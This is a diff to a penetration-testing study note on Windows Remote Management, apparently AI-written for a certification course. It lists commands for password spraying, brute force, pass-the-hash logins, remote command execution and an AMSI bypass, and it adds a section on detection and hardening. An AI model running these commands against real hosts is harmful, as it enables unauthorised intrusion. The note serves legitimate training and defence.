@@ -1,12 +1,27 @@
+# WinRM
+
 #WinRM #WindowsRemoteManagement #localsystemmanagement
 
 ## What is WinRM?
-Windows Remote Management — Microsoft's implementation of WS-Management (WS-Man) protocol. Enables remote command execution and management over SOAP/HTTP. PowerShell Remoting requires WinRM. Enabled by default on Windows Server 2012+ and Windows 10+.
+Windows Remote Management — Microsoft's WS-Management (WS-Man) implementation for remote command execution over SOAP/HTTP. PowerShell Remoting is built on it. Enabled by default on Windows Server 2012+; **not** on by default on client Windows. On an engagement it's the cleanest interactive foothold once you hold creds/a hash: membership in **Remote Management Users** (or local admin) is all it takes, and `evil-winrm` turns that into a full PowerShell shell.
 
-- Port **TCP 5985** — WinRM over HTTP (SOAP)
-- Port **TCP 5986** — WinRM over HTTPS (SOAP/TLS)
-- WinRS (Windows Remote Shell) — subcomponent for shell access
-- Requires membership in Remote Management Users group or Administrators
+- Port **TCP 5985** — WinRM over HTTP (SOAP); **TCP 5986** — WinRM over HTTPS (TLS)
+- WinRS (Windows Remote Shell) — the shell subcomponent
+- Access requires membership in **Remote Management Users** or **Administrators**
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Lateral Movement/evil-winrm\|evil-winrm]] | The primary WinRM shell — password/PtH/Kerberos, upload/download, AMSI bypass, in-memory exec |
+| [[Tools/Lateral Movement/NetExec\|NetExec]] | `nxc winrm` — validate creds/hash, spray, `-x`/`-X` command exec |
+| [[Tools/Auth/Hydra\|Hydra]] | Online brute (`winrm://`) |
+| [[Tools/Scanning/NMAP\|NMAP]] | `http-auth-finder` + version on 5985/5986 |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `scanner/winrm/winrm_auth_methods`, `winrm_login` |
+
+PowerShell Remoting (`Enter-PSSession`/`Invoke-Command`) and `winrs` are the native Windows clients, used inline below.
 
 ---
 
@@ -38,10 +53,10 @@ nmap -p 5985,5986 --script http-auth-finder,banner -sV <target>
 # Check if WinRM open/accepting auth
 curl -s -o /dev/null -w "%{http_code}" http://<target>:5985/wsman
 
-# CrackMapExec
-crackmapexec winrm <target>
-crackmapexec winrm <target> -u user -p pass
-crackmapexec winrm <target/24> -u users.txt -p passwords.txt
+# NetExec (nxc)
+nxc winrm <target>
+nxc winrm <target> -u user -p pass
+nxc winrm <target/24> -u users.txt -p passwords.txt
 
 # Metasploit
 use auxiliary/scanner/winrm/winrm_auth_methods
@@ -127,7 +142,7 @@ winrs -r:<target> -u:<user> -p:<pass> powershell -c "Get-Process"
 ### Brute Force
 
 ```bash
-crackmapexec winrm <target> -u users.txt -p passwords.txt
+nxc winrm <target> -u users.txt -p passwords.txt
 hydra -L users.txt -P passwords.txt winrm://<target>
 ```
 
@@ -135,19 +150,28 @@ hydra -L users.txt -P passwords.txt winrm://<target>
 
 ```bash
 evil-winrm -i <target> -u <user> -H <NTLM_hash>
-crackmapexec winrm <target> -u <user> -H <NTLM_hash>
+nxc winrm <target> -u <user> -H <NTLM_hash>
 ```
 
 ### With Compromised Credentials
 
 ```bash
 # Spray across AD hosts
-crackmapexec winrm 192.168.1.0/24 -u domainuser -p 'Password123'
+nxc winrm 192.168.1.0/24 -u domainuser -p 'Password123'
 
 # Execute commands
-crackmapexec winrm <target> -u <user> -p <pass> -x "whoami"
-crackmapexec winrm <target> -u <user> -p <pass> -X "Get-LocalUser"  # PowerShell
+nxc winrm <target> -u <user> -p <pass> -x "whoami"
+nxc winrm <target> -u <user> -p <pass> -X "Get-LocalUser"  # PowerShell
 ```
+
+---
+
+## Detection & Artefacts
+
+- **Every WinRM session spawns `wsmprovhost.exe`** on the target — that process (and any children it launches) is the primary tell; `evil-winrm`'s `Invoke-Binary`/`Bypass-4MSI` run as children of it.
+- **Logons are type 3 (network)**, event **4624**, plus WinRM-Operational and PowerShell **4103/4104** (script-block logging) — `Bypass-4MSI` and downloaded scripts show in 4104.
+- **Brute force** = repeated 5985 auth failures (4625) / `nxc winrm` runs.
+- Defensive baseline: HTTPS-only (5986), don't set `TrustedHosts = *`, restrict Remote Management Users, put admins in **Protected Users** (blocks PtH), and enable PowerShell script-block + module logging.
 
 ---
 
@@ -172,7 +196,17 @@ crackmapexec winrm <target> -u <user> -p <pass> -X "Get-LocalUser"  # PowerShell
 | Connect (SSL) | `evil-winrm -i host -u user -p pass -S` |
 | Upload file | `upload /local/file` (inside evil-winrm) |
 | Download file | `download C:\file.txt` (inside evil-winrm) |
-| Spray with CME | `crackmapexec winrm host -u users.txt -p pass.txt` |
-| Run command | `crackmapexec winrm host -u user -p pass -x "cmd"` |
+| Spray with nxc | `nxc winrm host -u users.txt -p pass.txt` |
+| Run command | `nxc winrm host -u user -p pass -x "cmd"` |
 | PS remoting | `Invoke-Command -ComputerName host -Credential cred -ScriptBlock {...}` |
 | Nmap check | `nmap -p 5985,5986 -sV host` |
+
+---
+
+> [!note] **See also** — sibling remote-exec channels [[Services/Local System Management/WMI|WMI]] and [[Services/File Xfer/SMB|SMB]] (psexec/smbexec); both ride [[Services/Local System Management/RPC|RPC]]. Shell/PtH context in [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]].
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-23*
+*Model: claude-opus-4-8*
